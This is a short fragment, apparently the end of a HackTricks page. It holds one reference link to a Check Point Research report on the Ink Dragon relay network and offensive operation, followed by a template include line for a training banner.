- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
